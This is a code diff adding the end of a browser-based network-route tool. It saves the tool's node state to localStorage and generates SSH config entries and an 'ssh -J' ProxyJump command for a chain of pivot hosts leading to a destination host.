+// ============ LOCALSTORAGE PERSISTENCE ============
+function saveState() {
+  try {
+    const state = { nodes, subnets, infraNodes };
+    localStorage.setItem('raccoonroute-state', JSON.stringify(state));
+  } catch(e) {}
+}
+
+function loadState() {
+  try {
+    const raw = localStorage.getItem('raccoonroute-state');
+    if(!raw) return false;
+    const state = JSON.parse(raw);
+    if(state.nodes && state.nodes.length>=2) {
+      nodes = state.nodes;
+      nodes.forEach(n => n._placed = true);
+    }
+    if(state.subnets) { subnets = state.subnets; }
+    if(state.infraNodes) { infraNodes = state.infraNodes; }
+    return true;
+  } catch(e) { return false; }
+}
+
+// ============ AUTO SSH CONFIG GENERATION ============
+function generateSSHConfig() {
+  const pivots = nodes.filter(n=>n.type==='pivot');
+  const ending = nodes.find(n=>n.type==='ending');
+  if(pivots.length===0) return '# No pivots configured';
+  let config = '# Auto-generated SSH config\n# Paste into ~/.ssh/config\n\n';
+  let prevHost = null;
+  pivots.forEach((p,i) => {
+    const alias = `hop${i+1}`;
+    config += `Host ${alias}\n`;
+    config += `  HostName ${p.ip}\n`;
+    config += `  User ${p.user||'user'}\n`;
+    if(prevHost) config += `  ProxyJump ${prevHost}\n`;
+    config += `\n`;
+    prevHost = alias;
+  });
+  if(ending) {
+    config += `Host dst\n`;
+    config += `  HostName ${ending.ip}\n`;
+    config += `  User ${ending.user||'user'}\n`;
+    if(prevHost) config += `  ProxyJump ${prevHost}\n`;
+  }
+  return config;
+}
+
+function generateProxyJumpCmd() {
+  const pivots = nodes.filter(n=>n.type==='pivot');
+  const ending = nodes.find(n=>n.type==='ending');
+  if(pivots.length===0 || !ending) return '# Incomplete chain';
+  const jumps = pivots.map(p=>`${p.user||'user'}@${p.ip}`).join(',');
+  return `ssh -J ${jumps} ${ending.user||'user'}@${ending.ip}`;
+}
+
+// Init
+loadState();
+window.addEventListener('resize', resize);
+resize();
+draw();
+renderBottom();
+</script>
+</body>
+</html>
